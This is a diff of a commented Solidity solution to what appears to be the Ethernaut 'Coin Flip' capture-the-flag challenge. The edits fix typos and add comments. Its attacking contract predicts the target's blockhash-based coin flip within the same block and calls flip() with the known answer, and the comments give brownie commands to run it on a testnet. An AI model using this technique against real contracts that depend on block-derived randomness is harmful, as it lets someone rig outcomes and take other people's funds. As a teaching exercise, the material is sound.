@@ -1,6 +1,6 @@
 /* 
 in this challenge, an attacking contract has to be created to ensure that the block number while the call to the CoinFlip
-contract is intiated is the same to get the correct guess everytime the CoinFlip contract is called
+contract is initiated is the same to get the correct guess everytime the CoinFlip contract is called
 
 
 
@@ -15,6 +15,7 @@ accounts.from_mnemonic("your account mnemonic")
 # go to the scripts folder and update the address and account mnemonic - filename "3-Coin-Flip.py"
 
 # run the script after in brownie console or run it directly
+
 brownie run 3-Coin-Flip.py --network rinkeby
 
 # OR
@@ -39,7 +40,7 @@ int('0x0a,16 ) => 10
 
 # submit the instance
 
-# (optionl) call destroy() to cleanup
+# (optionl) call destroy()
 
 */
 
@@ -66,16 +67,19 @@ constructor(address _address) public
 function attack() public {
 
 
-    // execute same logic as the CoinFlip contract to get the expected guess.
-    // remember if you intiate the call from your contract  to CoinFlip contract then the call will be in the same 
-    // block which ensures the calculations are the same
+    /* execute same logic as the CoinFlip contract to get the expected guess.
+       remember if you initiate the call from your contract  to CoinFlip contract then the call will be in the same 
+       block which ensures the calculations are the same
+    */
 
     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
 
     uint256 coinFlip = blockValue.div(FACTOR);
     
+    // calculate the guess in the current block
     bool side = coinFlip == 1 ? true : false;
-
+    
+    // call flip with calculated guess and check result
     bool result = CoinFlipContract.flip(side);
 
     // revert if result is False
